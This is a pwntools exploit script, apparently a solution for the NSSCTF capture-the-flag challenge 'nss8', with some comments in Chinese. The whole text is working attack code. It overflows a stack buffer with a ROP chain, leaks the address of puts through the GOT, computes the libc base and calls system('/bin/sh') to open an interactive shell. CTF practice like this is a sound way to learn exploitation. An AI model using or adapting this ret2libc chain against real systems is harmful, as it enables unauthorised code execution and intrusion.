from pwn import *
from LibcSearcher import *

elf = ELF('nss8')
# sh=remote("node5.anna.nssctf.cn",27527)
sh=process('./nss8')

context.log_level = 'debug' # 调试时很有用
gdb.attach(sh)
gets_plt=elf.plt['gets']
gets_got=elf.got['gets']
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
offset=80

pop_rdi=0x0000000000400c83
ret=0x00000000004006b9
main=elf.symbols['main']
bss=0x0000000000602080

# 1. leak libc address
sh.recvuntil(b'Input your choice!\n')
payload=b'1'
sh.sendline(payload)
print(sh.recvuntil(b'Input your Plaintext to be encrypted\n'))

payload=b'\0'*(offset+8)
payload+=(p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main))
sh.sendline(payload)
sh.recvuntil(b'Ciphertext\n')
sh.recvuntil(b'\n')
result=sh.recvuntil(b'\n')[:-1]
print(result)
puts_addr = u64(result.ljust(8,b'\0'))
print(hex(puts_addr))
#2.计算libc基址

libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc_base=puts_addr-libc.symbols['puts']
system_addr=libc_base+libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
# libc = LibcSearcher("puts", puts_addr)
# libc_base = puts_addr - libc.dump("puts")
# system_addr = libc_base + libc.dump("system")
# binsh_addr= libc_base + libc.dump("str_bin_sh")

#3.执行system("/bin/sh")
print(sh.recvuntil(b'Input your choice!\n'))
payload=b'1'
sh.sendline(payload)

payload2=b'a'*(offset+8)
payload2+=p64(ret)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)
sh.sendlineafter(b"Input your Plaintext to be encrypted\n", payload2)
sh.interactive()